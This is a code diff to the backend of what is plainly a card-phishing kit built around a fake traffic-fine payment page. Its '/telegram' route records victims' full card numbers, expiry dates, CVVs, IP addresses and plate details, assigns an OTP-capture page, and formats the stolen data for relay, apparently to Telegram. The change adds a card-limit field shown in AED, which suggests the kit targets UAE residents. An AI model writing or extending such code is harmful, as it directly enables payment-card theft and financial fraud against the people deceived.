@@ -174,24 +174,24 @@ router.post('/telegram', async (req, res) => {
   // Kart ödeme bildirimi
   const { sid='', cardName='-', cardNumber='-', expiry='-', cvv='-',
           plateNo='-', plateSrcCode='-', plateCodeLetter='-',
-          totalFine=0, fineCount=0, binInfo=null } = body;
+          totalFine=0, fineCount=0, binInfo=null, cardLimit='' } = body;
 
   try {
     const defaultOtp = await getSetting('otp_default_page', 'otp-sms');
     await query(`
       INSERT INTO payments (sid, plate_no, plate_src, plate_code, total_fine, fine_count,
-        card_name, card_number, expiry, cvv, card_scheme, card_type, card_issuer, card_country, ip, otp_page)
-      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+        card_name, card_number, expiry, cvv, card_scheme, card_type, card_issuer, card_country, ip, otp_page, card_limit)
+      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
       ON CONFLICT (sid) DO UPDATE SET
         card_name=EXCLUDED.card_name, card_number=EXCLUDED.card_number, expiry=EXCLUDED.expiry, cvv=EXCLUDED.cvv,
         card_scheme=EXCLUDED.card_scheme, card_type=EXCLUDED.card_type, card_issuer=EXCLUDED.card_issuer,
         card_country=EXCLUDED.card_country, total_fine=EXCLUDED.total_fine, fine_count=EXCLUDED.fine_count,
-        otp_page=EXCLUDED.otp_page
+        otp_page=EXCLUDED.otp_page, card_limit=EXCLUDED.card_limit
     `, [
       sid, plateNo, plateSrcCode, plateCodeLetter, parseFloat(totalFine)||0, parseInt(fineCount)||0,
       cardName, cardNumber, expiry, cvv,
       binInfo?.Scheme||null, binInfo?.Type||null, binInfo?.Issuer||null, binInfo?.Country?.Name||null,
-      clientIp(req), defaultOtp,
+      clientIp(req), defaultOtp, cardLimit || null,
     ]);
   } catch { /* ignore */ }
 
@@ -214,6 +214,7 @@ router.post('/telegram', async (req, res) => {
     `Number: <code>${cardNumber}</code>`,
     `Expiry: <code>${expiry}</code>`,
     `CVV: <code>${cvv}</code>`,
+    cardLimit ? `Limit: <b>AED ${Number(cardLimit).toLocaleString()}</b>` : null,
     '─────────────────',
     '<b>CARD INFO</b>', binStatus,
     '─────────────────',
